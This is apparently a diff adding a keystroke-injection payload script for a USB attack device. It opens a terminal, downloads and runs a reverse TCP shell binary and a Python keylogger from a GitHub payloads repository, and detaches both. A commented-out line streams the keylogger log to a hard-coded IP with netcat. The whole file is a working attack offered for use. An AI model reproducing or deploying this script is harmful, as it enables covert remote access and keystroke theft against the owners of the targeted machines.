@@ -1,0 +1,54 @@
+# Start Setup
+LED SETUP
+
+# Gets Switch Position
+GET SWITCH_POSITION
+
+# Set Attack Mode
+ATTACKMODE HID 
+
+# Get the switch position
+GET SWITCH_POSITION
+
+# Open a terminal
+Q CTRL-ALT t
+
+# Wait for terminal to open
+sleep 1
+LED STAGE1
+Q STRING "cd ~/Downloads"
+Q ENTER
+Q STRING "wget https://github.com/bentoro/payloads/blob/master/linux_reverse_tcp?raw=true"
+Q ENTER
+Q DELAY 4000
+Q STRING "chmod +x linux_reverse_tcp?raw=true"
+Q ENTER
+Q STRING "./linux_reverse_tcp?raw=true &disown"
+Q ENTER
+Q DELAY 1000
+
+# Keylogger
+Q STRING "cd ~/Downloads"
+Q ENTER
+Q DELAY 1000
+#Q STRING "wget https://raw.githubusercontent.com/bentoro/payloads/master/pyxhook.py"
+Q ENTER
+Q DELAY 4000
+#Q STRING "wget https://raw.githubusercontent.com/bentoro/payloads/master/keylogger.py"
+Q STRING "wget https://raw.githubusercontent.com/bentoro/payloads/master/windows_keylogger.py"
+Q ENTER
+Q DELAY 4000
+Q STRING "python3 windows_keylogger.py &disown"
+Q ENTER
+Q DELAY 1000
+
+#Add netcat
+#Q STRING "tail -f keylogger.log | nc 192.168.0.15 8506 &disown"
+#Q ENTER
+
+# Quit the terminal
+LED CLEANUP
+#Q STRING exit
+#Q ENTER
+
+LED FINISH
